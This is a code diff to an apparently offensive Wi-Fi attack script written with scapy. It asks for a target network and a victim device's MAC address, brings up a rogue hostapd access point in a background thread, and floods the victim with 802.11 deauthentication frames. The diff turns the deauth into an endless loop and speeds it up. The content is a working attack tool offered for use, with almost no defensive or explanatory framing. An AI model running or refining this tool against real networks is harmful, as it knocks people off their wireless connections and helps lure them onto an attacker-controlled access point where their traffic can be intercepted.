@@ -215,18 +215,19 @@ def output_client(net):
                                                        client_AP[i]['BSSID']))
 
 
-def deauth(target_mac, iface, count):
+def deauth(target_mac, iface):
     global client_AP
     bssid = client_AP[target_mac]['BSSID']
     dot11 = Dot11(type=0, subtype=12, addr1=target_mac, addr2=bssid, addr3=bssid)
-    frame = RadioTap() / dot11 / Dot11Deauth()
-    print("[+] starting attack...")
-    sendp(frame, iface=iface, count=count, inter=.2, verbose=1)
+    frame = RadioTap() / dot11 / Dot11Deauth(reason=7)
+    print("[+] started deauth attack...")
+    sendp(frame, iface=iface, loop=1, inter=.1, verbose=1)
 
 
 def launchHostapd(iface, net):
     global AP
     # Hostapd configuration
+    os.system("killall hostapd")
     print('[+] Configuring hostapd...')
     hostapdConfigFile = 'hostapd.conf'
     hostapdConfig = ''
@@ -264,6 +265,11 @@ if __name__ == "__main__":
     network = input("enter the mac address of the network you want to attack: ")
     output_client(network)
     victim = input("enter the mac address of the station you want to attack: ")
+    os.system("iwconfig "+interface+" channel " + str(client_AP[victim]['channel']))
+
     time.sleep(1)
-    deauth(victim, interface,count)
-    launchHostapd(interface, network)
+    t = Thread(target=launchHostapd, args=(interface, network))
+    t.setDaemon(True)
+    t.start()
+    time.sleep(3)
+    deauth(victim, interface)
